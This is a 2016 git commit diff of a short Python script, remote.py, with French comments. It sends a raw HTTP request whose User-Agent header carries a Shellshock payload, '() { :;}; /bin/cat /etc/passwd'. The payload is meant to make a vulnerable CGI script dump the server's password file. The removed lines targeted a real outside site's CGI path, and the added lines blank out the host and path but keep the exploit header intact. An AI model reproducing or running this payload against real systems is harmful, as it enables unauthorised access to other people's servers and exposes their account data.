064edd6eb4bd43d09c72a88eb1e247c0404c5bd1
Massef <cedima1@yahoo.fr>
2016-01-31 17:03:28 +0100

    Update remote.py

--- remote.py
+++ remote.py
@@ -5,13 +5,13 @@ import socket,subprocess # on importe le module, TRES IMPORTANT !
 #creation de la socket puis connexion
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("www.fornax.sk",80))
+s.connect(("www.",80))
 
  
 # preparation de la requete
-Request = "GET /cgi-bin/www/fortunes.sh HTTP/1.1\r\n"
+Request = "GET  HTTP/1.1\r\n"
 
-Request+= "Host: www.fornax.sk\r\n"
+Request+= "Host: \r\n"
 Request+= "User-Agent: () { :;}; /bin/cat /etc/passwd\r\n"
 Request+= "Connection: Close\r\n\r\n"
 
